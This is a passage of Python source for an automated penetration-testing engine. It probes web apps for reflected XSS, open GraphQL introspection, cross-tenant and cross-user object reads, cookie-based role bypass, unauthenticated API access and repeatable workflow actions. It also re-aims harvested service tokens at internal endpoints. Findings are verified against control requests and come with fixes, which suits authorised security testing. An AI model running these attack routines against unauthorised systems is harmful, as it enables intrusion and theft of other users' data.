                    by_url[l.url].append(l.param)
        # search-ish paths with NO discovered param still get the bounded
        # standard-param probe (q/query/s/search) — real operators do this
        for l in self._leads:
            if (l.kind == "path" and l.url and l.url not in by_url
                    and re.search(r"search|query|find|list", l.url.lower())):
                by_url[l.url] = ["q", "query", "s", "search"]
        for url, params in by_url.items():
            if not params:
                continue
            full = self._base + url if url.startswith("/") else url
            res = self._run_tool("xss_reflect_probe", url=full, params=params,
                                 reason="deterministic reflection map")
            for lead in res.get("leads", []):
                spec = lead.get("check_spec")
                if not spec or not lead.get("specials_survive"):
                    continue
                res_v = self._run_tool(
                    "verify_vulnerability",
                    title=f"Reflected XSS at {url} ({lead.get('param')})",
                    severity="medium", target=url,
                    summary=f"Marker reflected unescaped in {lead.get('context')} "
                            f"context; READY check_spec executed 1:1 by the "
                            f"proof pipeline.",
                    requests=spec.get("requests", {}),
                    conditions=spec.get("conditions", []),
                    cwe="CWE-79",
                    recommendation="Contextual output encoding; CSP.")
                if res_v.get("recorded"):
                    hit = True
        return hit

    # -- Brain rounds: signal-driven bets over the executor's hands -----------

    def _brain_rounds(self, budget: int = 10) -> list[str]:
        brain = self._brain
        assert brain is not None
        # seed the state hypotheses consume: principals + url-bearing endpoints
        brain.refresh_principals()
        brain.state.url_bearers = [
            l.url for l in self._leads
            if l.believed() and l.method == "POST"
            and re.search(r"import|fetch|url|upload|proxy", (l.url or "").lower())]
        ran: list[str] = []
        deferred: list[str] = []

        def _drain():
            while brain.queue and len(ran) < budget:
                hyp = brain.queue.pop(0)
                remaining = getattr(getattr(self._ctx, "limiter", None),
                                    "remaining", None)
                if isinstance(remaining, int) and hyp.horizon > remaining:
                    # horizon-aware budgeting: a bet that cannot FINISH before
                    # the request budget dies is deferred, never half-executed
                    # — a proof that cannot complete is the most expensive
                    # kind of waste (the survey's "context exhaustion before
                    # chain completion", translated to request budgets).
                    deferred.append(f"{hyp.id} (horizon {hyp.horizon} > "
                                    f"{remaining} left)")
                    continue
                try:
                    confirmed, learned = self._execute_hypothesis(hyp)
                except Exception as exc:  # a bad bet must never kill the run
                    confirmed, learned = False, f"executor error: {exc}"
                brain.note_hypothesis_result(hyp, confirmed, learned)
                ran.append(f"{hyp.id}{'*' if confirmed else ''}")
                self._audit("brain.hypothesis.executed", id=hyp.id,
                            kind=hyp.kind, source=hyp.source,
                            horizon=hyp.horizon,
                            confirmed=confirmed, learned=learned[:160])
                brain.generate()  # chaining: each result may mint the next bet

        brain.generate()
        _drain()
        # the model enters ONE queue — after the deterministic queue drained,
        # spending only what is left of the budget. Amplifier, never a
        # dependency: a failing or absent model changes nothing above.
        if self._llm_chat is not None:
            try:
                from .llm.planner import propose
                results = propose(brain, self._llm_chat, self._ctx.audit)
                for ok, why in results:
                    self._log(f"[planner] admitted={ok} {why}")
            except Exception as exc:  # amplifier failure == no model at all
                self._log(f"[planner] unavailable: {exc}")
            _drain()
        if deferred:
            self._audit("brain.horizon.deferral", bets=deferred[:10],
                        count=len(deferred))
        return ran

    def _execute_hypothesis(self, hyp: Hypothesis) -> tuple[bool, str]:
        dispatch = {
            "surface-probe": self._exec_surface_probe,
            "graphql-schema-map": self._exec_graphql_map,
            "graphql-cross-tenant": self._exec_graphql_cross_tenant,
            "cookie-forge": self._exec_cookie_forge,
            "cross-principal-read": self._exec_cross_principal_read,
            "unauth-access": self._exec_unauth_access,
            "bearer-pivot": self._exec_bearer_pivot,
            "workflow-chain": self._exec_workflow_chain,
            "internal-pivot": lambda h: (
                self._workflow_ssrf(), "delegated to ssrf-callback-map"),
        }
        fn = dispatch.get(hyp.kind)
        if fn is None:
            return False, f"no executor for kind {hyp.kind}"
        return fn(hyp)

    # -- executor: surface probe (R0 — the recon/exploit bridge) --------------

    def _exec_surface_probe(self, hyp: Hypothesis) -> tuple[bool, str]:
        paths = hyp.probes.get("paths", [])
        before = len(self._brain.state.signals)
        # the operator browses logged-in too: each door is opened unauthenticated
        # AND as a held principal — authed responses carry the workflow signals
        low = next((p for p in sorted(self._creds)
                    if self._ctx.sessions and self._ctx.sessions.get(p)
                    and not re.search(r"admin|root|super", p)), None)
        for path in paths:
            url = self._base + path if path.startswith("/") else path
            self._fetch({"method": "GET", "url": url}, tool="http_probe")
            if low:
                self._fetch({"method": "GET", "url": url,
                             "headers": dict(self._ctx.sessions.get(low).headers)},
                            tool="http_probe")
        new = len(self._brain.state.signals) - before
        # exploratory by design: never 'confirms', always feeds observe()
        return False, f"opened {len(paths)} paths, {new} fresh signals"

    # -- executor: workflow chain (R7 — the multi-step state organ) ------------

    def _exec_workflow_chain(self, hyp: Hypothesis) -> tuple[bool, str]:
        mutate_url = hyp.probes.get("mutate_url", "")
        read_url = hyp.probes.get("read_url", "")
        field = hyp.probes.get("read_field", "total")
        low = hyp.probes.get("principal", "")
        second = hyp.probes.get("second", "")
        if not (mutate_url and read_url and low and second):
            return False, "incomplete workflow probes"
        # one boundary proving is enough: same action, same flaw
        if any(f.cwe == "CWE-840" and mutate_url.split("?")[0] in (f.target or "")
               for f in self._ctx.findings.all()):
            return False, "workflow abuse already proven here"
        lh = dict(self._ctx.sessions.get(low).headers)
        sh = dict(self._ctx.sessions.get(second).headers)

        def _step(name, url, headers, label):
            return {"name": name, "method": "GET", "url": self._base + url,
                    "headers": headers, "session_label": label}

        # attack: apply, read, apply AGAIN, read — drift means the action is
        # not bound one-shot. control: a second principal applies ONCE and
        # reads twice — no drift is the honest baseline.
        attack_steps = [
            _step("mutate1", mutate_url, lh, low),
            _step("read1", read_url, lh, low),
            _step("mutate2", mutate_url, lh, low),
            _step("read2", read_url, lh, low),
        ]
        control_steps = [
            _step("mutate1", mutate_url, sh, second),
            _step("read1", read_url, sh, second),
            _step("read2", read_url, sh, second),
        ]
        res = self._run_tool(
            "verify_workflow_abuse",
            title=f"Repeating the workflow action at "
                  f"{mutate_url.split('?')[0]} keeps moving {field}",
            severity="critical", target=mutate_url.split("?")[0],
            summary=f"The app's own action link {mutate_url} applies a state "
                    f"change and reports success. Repeating it as '{low}' "
                    f"changes {field} again (read1 vs read2 differ) — the "
                    f"action is not bound one-shot. Control: '{second}' "
                    f"applies once and reads twice with no drift. Proof is "
                    f"two ordered sequences run once each (attack vs "
                    f"control), never k-of-n — one-shot semantics.",
            attack_steps=attack_steps, control_steps=control_steps,
            invariant=[{"type": "json_differs", "request_a": "read1",
                        "request_b": "read2", "json_path": field}],
            cwe="CWE-840",
            recommendation="Bind one-shot state changes to a single-use "
                           "redemption record; reject repeats idempotently.")
        if res.get("verdict") == "falsified":
            return False, "control also drifted -> action legitimately repeatable"
        return bool(res.get("recorded")), \
            "ordered-sequence proof handed to the pipeline"

    # -- executor: bearer pivot (R6 — harvest -> re-aim) -----------------------

    def _exec_bearer_pivot(self, hyp: Hypothesis) -> tuple[bool, str]:
        targets = hyp.probes.get("targets", [])
        tokens = []
        for t in hyp.probes.get("tokens", []):
            # proposals NEVER carry credential values — a model sees only
            # "@harvested:<index>" refs; the executor resolves them locally
            if isinstance(t, str) and t.startswith("@harvested:"):
                try:
                    idx = int(t.split(":", 1)[1])
                except ValueError:
                    continue
                if 0 <= idx < len(self._brain.state.tokens):
                    tokens.append(self._brain.state.tokens[idx][0])
            else:
                tokens.append(t)
        principals = [p for p in sorted(self._creds)
                      if self._ctx.sessions and self._ctx.sessions.get(p)]
        low = next((p for p in principals
                    if not re.search(r"admin|root|super", p)), None)
        hit = False
        learned = []
        for tok in tokens:
            hdrs = {"Authorization": f"Bearer {tok}"}
            for path in targets:
                # one boundary proving is enough: same realm, same flaw
                if any(f.cwe == "CWE-285" and (path in (f.target or "")
                                               or (f.target or "") in path)
                       for f in self._ctx.findings.all()):
                    learned.append(f"{path}: boundary already proven")
                    continue
                url = self._base + path if path.startswith("/") else path
                payload = {"method": "GET", "url": url, "headers": dict(hdrs)}
                st_p, body_p = self._preobserve(payload)
                if st_p != 200:
                    learned.append(f"{path}: token rejected ({st_p})")
                    continue
                st_u, _ = self._preobserve({"method": "GET", "url": url})
                # the honest boundary: a MEMBER principal must be denied too —
                # otherwise the endpoint is open to everyone (a different bug)
                member_status, member_body = None, ""
                if low:
                    mh = dict(self._ctx.sessions.get(low).headers)
                    member_status, member_body = self._preobserve(
                        {"method": "GET", "url": url, "headers": mh})
                if member_status == 200:
                    learned.append(f"{path}: open to all members — not a "
                                   f"privilege boundary")
                    continue
                # over-reach marker: material the member view cannot produce
                structural = re.search(r"password_hash|salary|api_key|secret",
                                       body_p or "")
                marker = next((t for t in dict.fromkeys(
                    re.findall(r"[\w$.\-/]{10,}", body_p or ""))
                    if t not in (member_body or "") and t not in tok), "")
                cond_pat = (structural.group(0) if structural
                            else re.escape(marker))
                if not cond_pat:
                    learned.append(f"{path}: 200 but no over-reach material")
                    continue
                self._ctx.sessions.set("internal-api", dict(hdrs))
                self._record_pivot_disclosure(tok)
                res_v = self._run_tool(
                    "verify_vulnerability",
                    title=f"Harvested service token crosses the privilege "
                          f"boundary at {path}",
                    severity="critical", target=path,
                    summary=f"A service credential disclosed at harvest time "
                            f"(first-party) authenticates to {path} and "
                            f"returns material "
                            f"({'structural: ' + cond_pat if structural else 'marker ' + cond_pat[:16]})"
                            f" that a member principal is DENIED"
                            f"{' (' + str(member_status) + ')' if member_status else ''}"
                            f" and the unauthenticated caller cannot get "
                            f"({st_u}) — the realm's role check does not run "
                            f"for service tokens (CWE-285).",
                    requests={"payload": payload,
                              "control": {"method": "GET", "url": url}},
                    conditions=[
                        {"type": "status", "request": "payload", "equals": 200},
                        {"type": "body_regex", "request": "payload",
                         "pattern": cond_pat, "present": True},
                        {"type": "status", "request": "control",
                         "equals": st_u}],
                    negative_control={"method": "GET", "url": url},
                    cwe="CWE-285",
                    recommendation="Scope service tokens to their service; run "
                                   "the same role check for every token class.")
                recorded = bool(res_v.get("recorded"))
                hit = hit or recorded
                learned.append(f"{path}: boundary crossed, pipeline owns verdict")
        return hit, "; ".join(learned)[:200]

    def _record_pivot_disclosure(self, tok: str) -> None:
        """The harvest itself is a finding: a credential served unauthenticated
        (once per run)."""
        if getattr(self, "_pivot_disclosure_done", False):
            return
        src = next((u for t, u in self._brain.state.tokens if t == tok), "")
        if not src:
            return
        self._pivot_disclosure_done = True
        path = ("/" + src.split("//", 1)[1].split("/", 1)[1]
                if src.startswith("http") else src)
        ctrl = {"method": "GET",
                "url": self._base + f"/no-such-{int(time.time())}"}
        st_c, _ = self._preobserve(ctrl)
        self._run_tool(
            "verify_vulnerability",
            title=f"Service credential disclosed at {path}",
            severity="high", target=path,
            summary=f"{path} serves a live service token to unauthenticated "
                    f"callers; re-aimed at the internal realm it crosses a "
                    f"privilege boundary (chained separately).",
            requests={"payload": {"method": "GET", "url": self._base + path},
                      "control": ctrl},
            conditions=[{"type": "status", "request": "payload", "equals": 200},
                        {"type": "body_regex", "request": "payload",
                         "pattern": re.escape(tok), "present": True},
                        {"type": "status", "request": "control",
                         "equals": st_c}],
            negative_control=ctrl, cwe="CWE-200",
            recommendation="Require auth for debug/config endpoints; rotate "
                           "the exposed credential.")

    # -- executor: graphql schema map (the chaining example) -------------------

    def _exec_graphql_map(self, hyp: Hypothesis) -> tuple[bool, str]:
        ep = hyp.probes.get("endpoint", "/graphql")
        url = self._base + ep if ep.startswith("/") else ep
        # 0) the deterministic checklist (lead only, 4 benign requests)
        check = self._run_tool("graphql_inspect", url=url,
                               reason="shape signal -> schema mapping")
        intros_open = any("introspection" in (l.get("kind") or "")
                          for l in check.get("leads", []))
        # 1) first-party introspection pull — the schema IS the attack map.
        #    An authenticated API needs a principal: try none, then each held
        #    session (the RoE hands us the door; the executor walks through it).
        payload = {"method": "POST", "url": url,
                   "body": json.dumps({"query": _INTROSPECTION_Q})}
        control = {"method": "POST", "url": url,
                   "body": json.dumps({"query": "{ __nonsense_probe { a } }"})}
        st_p, body_p = self._preobserve(payload)
        if st_p in (401, 403):
            for p in sorted(self._creds):
                if self._ctx.sessions and self._ctx.sessions.get(p):
                    auth = dict(self._ctx.sessions.get(p).headers)
                    payload["headers"] = dict(auth)
                    control["headers"] = dict(auth)
                    st_p, body_p = self._preobserve(payload)
                    if st_p == 200:
                        break
        st_c, body_c = self._preobserve(control)
        if st_p != 200 or "queryType" not in (body_p or ""):
            return False, ("introspection disabled or unreachable "
                           f"(payload {st_p}) — hypothesis killed, as predicted")
        res_v = self._run_tool(
            "verify_vulnerability",
            title=f"GraphQL introspection open at {ep}",
            severity="medium", target=ep,
            summary=f"{ep} answers a full __schema introspection query with the "
                    f"schema graph while a nonsense field query is rejected "
                    f"({st_c}) — schema disclosure to any authenticated caller "
                    f"(CWE-200).",
            requests={"payload": payload, "control": control},
            conditions=[{"type": "status", "request": "payload", "equals": 200},
                        {"type": "body_regex", "request": "payload",
                         "pattern": "queryType", "present": True},
                        {"type": "body_regex", "request": "control",
                         "pattern": "queryType", "present": False}],
            negative_control=control, cwe="CWE-200",
            recommendation="Disable introspection outside development; gate "
                           "schema exposure.")
        confirmed = bool(res_v.get("recorded"))
        # 2) CHAINING: id-arg queries mint the cross-tenant bets
        schema = _parse_json_loose(body_p) or {}
        fields = (((schema.get("data") or {}).get("__schema") or {})
                  .get("queryType") or {}).get("fields") or []
        id_args = [f for f in fields
                   if any(re.search(r"(?i)^(id|user[_-]?id|uid|account|acct)$",
                                    (a.get("name") or "")) for a in f.get("args", []))]
        for f in id_args:
            arg = next((a for a in f.get("args", [])
                        if re.search(r"(?i)^(id|user[_-]?id|uid|account|acct)$",
                                     a.get("name") or "")), None)
            if not arg:
                continue
            self._brain.state.graphql_endpoints.append(ep)
            self._brain._seen_hyp.add("graphql-cross-tenant:" + f["name"])
            self._brain.queue.append(Hypothesis(
                id=f"graphql-cross-tenant#{f['name']}",
                kind="graphql-cross-tenant",
                statement=f"{ep} exposes {f['name']}({arg['name']}:) — if the "
                          f"owner check is missing, any token reads any ledger",
                prediction="low principal querying another principal's id "
                           "receives THAT principal's records",
                severity="critical", cwe="CWE-639",
                rank=9.0, cost=6,
                probes={"endpoint": ep, "field": f["name"], "arg": arg["name"]},
                source=f"introspection@{ep}"))
            self._log(f"    chain: {f['name']}({arg['name']}:) -> cross-tenant bet")
        return confirmed, (f"introspection open; {len(fields)} fields mapped; "
                          f"{len(id_args)} id-arg queries minted")

    # -- executor: graphql cross-tenant read -----------------------------------

    def _exec_graphql_cross_tenant(self, hyp: Hypothesis) -> tuple[bool, str]:
        ep = hyp.probes.get("endpoint", "/graphql")
        field, arg = hyp.probes.get("field", ""), hyp.probes.get("arg", "userId")
        url = self._base + ep if ep.startswith("/") else ep
        principals = [p for p in sorted(self._creds)
                      if self._ctx.sessions and self._ctx.sessions.get(p)]
        if len(principals) < 2:
            return False, "needs two RoE principals; none held"
        low = next((p for p in principals
                    if not re.search(r"admin|root|super", p)), principals[0])
        other = next((p for p in principals if p != low), "")
        hdrs_for = lambda p: dict(self._ctx.sessions.get(p).headers)

        def gq(uid: str, hdrs: dict) -> dict:
            q = f'{{ {field}({arg}: "{uid}") {{ id user merchant amount card }} }}'
            return {"method": "POST", "url": url, "headers": hdrs,
                    "body": json.dumps({"query": q})}

        # 1) who am I: each principal's own id (the differential's coordinates)
        own_ids = {}
        for p in principals:
            me = {"method": "POST", "url": url, "headers": hdrs_for(p),
                  "body": json.dumps({"query": "{ me { id user role } }"})}
            st_m, body_m = self._preobserve(me)
            m = ID_SHAPE.search(body_m or "")
            if st_m == 200 and m:
                own_ids[p] = m.group(1)
        if low not in own_ids or other not in own_ids:
            return False, f"could not resolve own ids: {own_ids}"
        # 2) the bet: low principal asks for OTHER's ledger
        payload = gq(own_ids[other], hdrs_for(low))
        control = gq(own_ids[low], hdrs_for(low))
        st_p, body_p = self._preobserve(payload)
        st_c, body_c = self._preobserve(control)
        if st_p != 200:
            return False, f"cross-tenant query returned {st_p} — bet dead"
        # 3) reference: OTHER's own view (their token) — the material that
        #    must appear in the leak and NOWHERE in low's own view
        st_o, body_o = self._preobserve(gq(own_ids[other], hdrs_for(other)))
        distinctive = [t for t in dict.fromkeys(
            re.findall(r"[\w\-]{8,}", body_o or ""))
            if t not in (body_c or "")][:3]
        if not distinctive or distinctive[0] not in (body_p or ""):
            return False, ("no other-principal material in the response — "
                           "authorization held")
        marker = distinctive[0]
        res_v = self._run_tool(
            "verify_vulnerability",
            title=f"Cross-tenant {field} read via {arg} (no ownership check) "
                  f"({ep})",
            severity="critical", target=ep,
            summary=f"Principal '{low}' queries {field}({arg}: "
                    f"\"{own_ids[other]}\") and receives '{other}''s ledger "
                    f"(marker '{marker[:8]}...' — absent from '{low}''s own "
                    f"view); the schema came from open introspection. The "
                    f"owner is never checked against the caller (CWE-639).",
            requests={"payload": payload, "control": control},
            conditions=[{"type": "status", "request": "payload", "equals": 200},
                        {"type": "body_regex", "request": "payload",
                         "pattern": re.escape(marker), "present": True},
                        {"type": "body_regex", "request": "control",
                         "pattern": re.escape(marker), "present": False}],
            negative_control=control, cwe="CWE-639",
            recommendation="Resolve the object owner from the token and check "
                           "it on every field resolver.")
        return bool(res_v.get("recorded")), (
            f"{low} read {other}'s ledger — pipeline owns the verdict")

    # -- executor: cookie forgery from signals ---------------------------------

    def _exec_cookie_forge(self, hyp: Hypothesis) -> tuple[bool, str]:
        gate = hyp.probes.get("gate", "")
        gate_status = hyp.probes.get("gate_status", 403)
        path = gate if gate.startswith("/") else "/" + gate
        principals = [p for p in sorted(self._creds)
                      if self._ctx.sessions and self._ctx.sessions.get(p)]
        low = next((p for p in principals
                    if not re.search(r"admin|root|super", p)), None)
        if not low:
            return False, "no low-privilege principal held"
        low_hdrs = dict(self._ctx.sessions.get(low).headers)
        for variant in hyp.probes.get("variants", []):
            payload = {"method": "GET", "url": self._base + path,
                       "headers": {**low_hdrs, "Cookie": variant}}
            control = {"method": "GET", "url": self._base + path,
                       "headers": dict(low_hdrs)}
            st_p, _ = self._preobserve(payload)
            st_c, _ = self._preobserve(control)
            if st_p != 200 or st_c == 200:
                continue
            res_v = self._run_tool(
                "verify_vulnerability",
                title=f"Client-controlled role cookie bypasses the gate ({path})",
                severity="high", target=path,
                summary=f"{path} denies '{low}' ({st_c}) but accepts the same "
                        f"token with client-supplied Cookie '{variant}' — "
                        f"authorization from client state (CWE-284).",
                requests={"payload": payload, "control": control},
                conditions=[{"type": "status", "request": "payload",
                             "equals": 200},
                            {"type": "status", "request": "control",
                             "equals": st_c}],
                negative_control=control, cwe="CWE-284",
                recommendation="Derive authorization from the token.")
            return bool(res_v.get("recorded")), f"variant {variant} -> {st_p}/{st_c}"
        return False, "no variant passed the gate — hypothesis killed"

    # -- executor: cross-principal HTTP read from observed ids -----------------

    def _exec_cross_principal_read(self, hyp: Hypothesis) -> tuple[bool, str]:
        probes = hyp.probes
        resource, other_id = probes.get("resource", ""), probes.get("id", "")
        low, other = probes.get("low", ""), probes.get("other", "")
        if not (resource and other_id and low and other):
            return False, "incomplete probes"
        low_hdrs = dict(self._ctx.sessions.get(low).headers)
        # signals key by full URL; the executor speaks in paths
        if resource.startswith("http"):
            resource = "/" + resource.split("//", 1)[1].split("/", 1)[-1]
        # inject the other principal's id into the observed id position
        m = re.search(r"(?i)(id|userId|user_id|uid|account|acct)[=/]", resource)
        payload_url = re.sub(r"(?i)((?:id|userId|user_id|uid|account|acct)[=/])"
                             r"[A-Za-z0-9_\-]+", rf"\g<1>{other_id}", resource)
        if payload_url == resource:
            payload_url = (resource + ("&" if "?" in resource else "?")
                           + f"id={other_id}")
        payload = {"method": "GET", "url": self._base + payload_url,
                   "headers": dict(low_hdrs)}
        control = {"method": "GET", "url": self._base + payload_url}
        st_p, body_p = self._preobserve(payload)
        st_c, _ = self._preobserve(control)
        if st_p != 200 or st_c == 200:
            return False, f"{st_p}/{st_c} — no ownership gap here"
        # the honest differential: the payload must return THE OTHER
        # PRINCIPAL'S material, not merely "200 where unauth is denied" — an
        # endpoint that silently ignores the id parameter returns the caller's
        # own view and must not pass (shakedown 20261114: exactly that false
        # positive on a correctly-scoped list endpoint).
        owner_marker = ""
        if other and self._ctx.sessions and self._ctx.sessions.get(other):
            st_o, body_o = self._preobserve(
                {"method": "GET", "url": self._base + payload_url,
                 "headers": dict(self._ctx.sessions.get(other).headers)})
            st_l, body_l = self._preobserve(
                {"method": "GET", "url": self._base + resource,
                 "headers": dict(low_hdrs)})
            if st_o == 200 and body_o:
                owner_marker = next(
                    (t for t in dict.fromkeys(re.findall(r"[\w\-.]{6,}", body_o))
                     if t not in (body_l or "") and not t.isdigit()), "")
        if not owner_marker:
            return False, ("no material unique to the owner's view -> "
                           "cannot prove a cross-principal leak")
        res_v = self._run_tool(
            "verify_vulnerability",
            title=f"Cross-principal object read at {payload_url}",
            severity="critical", target=payload_url,
            summary=f"Observed id shape ({other_id}) replayed by '{low}' "
                    f"returns 200 while unauthenticated is denied ({st_c}) "
                    f"and the response carries the owner's material "
                    f"({owner_marker[:24]}) — object lookup without an "
                    f"owner check (CWE-639).",
            requests={"payload": payload, "control": control},
            conditions=[{"type": "status", "request": "payload", "equals": 200},
                        {"type": "body_regex", "request": "payload",
                         "pattern": re.escape(owner_marker), "present": True},
                        {"type": "status", "request": "control",
                         "equals": st_c}],
            negative_control=control, cwe="CWE-639",
            recommendation="Enforce object-level authorization.")
        return bool(res_v.get("recorded")), f"{st_p}/{st_c}"

    # -- executor: missing function level auth ----------------------------------

    def _exec_unauth_access(self, hyp: Hypothesis) -> tuple[bool, str]:
        gate = hyp.probes.get("gate", "")
        path = gate if gate.startswith("/") else "/" + gate
        for method, body in (("GET", None), ("POST", "{}"), ("PUT", "{}")):
            payload = {"method": method, "url": self._base + path, "body": body}
            st, body_p = self._preobserve(payload)
            if st == 200 and len(body_p or "") > 16:
                ctrl = {"method": method,
                        "url": self._base + f"/no-such-{int(time.time())}"}
                st_c, _ = self._preobserve(ctrl)
                res_v = self._run_tool(
                    "verify_vulnerability",
                    title=f"{method} {path} answers without authentication",
                    severity="high", target=path,
                    summary=f"{path} was UI-gated ({hyp.probes.get('status')}) "
                            f"but the API answers {method} unauthenticated "
                            f"(CWE-285).",
                    requests={"payload": payload, "control": ctrl},
                    conditions=[{"type": "status", "request": "payload",
                                 "equals": 200},
                                {"type": "status", "request": "control",
                                 "equals": st_c}],
                    negative_control=ctrl, cwe="CWE-285",
                    recommendation="Server-side authorization on every API path.")
                return bool(res_v.get("recorded")), f"{method} -> {st}"
        return False, "gate is a real API check — hypothesis killed"

    # -- verify pass (the pipeline's verdict, not the engine's) -----------------

    def _verify_pass(self) -> dict:
        pending = self._ctx.findings.pending()
        out = {"pending_before": len(pending), "confirmed": 0,
               "killed": 0, "still_pending": 0}
        for f in pending:
            kwargs = {"finding_id": f.id}
            spec = getattr(f, "check_spec", None) or {}
            if getattr(f, "check_type", "") == "workflow" \
                    and spec.get("attack_steps"):
                # workflow findings demand fresh sequences (one-shot semantics:
                # a verbatim replay of a truly one-shot action degrades to the
                # weak verdict by design — the attack failing reads as
                # not_reproducible, never as a false kill). The executor's
                # steps ARE the replayable form of this bet.
                kwargs["fresh_attack_steps"] = spec["attack_steps"]
                kwargs["fresh_control_steps"] = spec["control_steps"]
            res = _parse_json_loose(self._tool("verify_finding_independently")
                                    .run(self._ctx, **kwargs)) or {}
            verdict = res.get("verdict", "not_reproducible")
            if verdict == "confirmed":
                out["confirmed"] += 1
            elif verdict == "falsified":
                out["killed"] += 1
            else:
                out["still_pending"] += 1
            self._audit("offensive.verify.outcome", finding_id=f.id,
                        verdict=verdict)
        return out


# ----------------------------------------------------------------------------
# CLI — one live engagement, model-free
# ----------------------------------------------------------------------------

def main(argv: list[str] | None = None) -> int:  # pragma: no cover - live CLI
    import argparse
    ap = argparse.ArgumentParser(description="Deterministic offensive engine "
                                             "(skills executed as code)")
    ap.add_argument("--engagement", required=True)
    ap.add_argument("--base-url", required=True)
    ap.add_argument("--out", default="runs/offensive")
    args = ap.parse_args(argv)
    eng = load_engagement(args.engagement)
    from .access import AccessGraph
    from .audit import AuditLog
    from .findings import FindingStore
    from .inventory import AssetInventory
    from .killchain import KillChain
    from .knowledge import KnowledgeGraph
    from .ratelimit import RateLimiter
    from .scope import ScopeGuard
    from .session import SessionStore
    from .traffic import TrafficRecorder
    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)
    ctx = ToolContext(
        scope=ScopeGuard(eng), limiter=RateLimiter(eng.max_requests_per_second,
                                                   eng.max_total_requests),
        audit=AuditLog(out / "audit.log.jsonl"), findings=FindingStore(out / "findings.json"),
        approve=lambda action, details: True,  # isolated lab: engine only proves, never destroys
        graph=KnowledgeGraph(out / "graph.json"), sessions=SessionStore(),
        access=AccessGraph(out / "access.json"), objective=eng.objective,
        killchain=KillChain(out / "killchain.json"),
        traffic=TrafficRecorder(out / "traffic.jsonl"),
        inventory=AssetInventory(out / "inventory.json"))
    eng_obj = eng
    engine = OffensiveEngine(eng_obj, ctx=ctx)
    engine._base_override = args.base_url
    summary = engine.run()
    print(json.dumps(summary, indent=2, default=str))
    print(f"artifacts under {out}")
    return 0


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
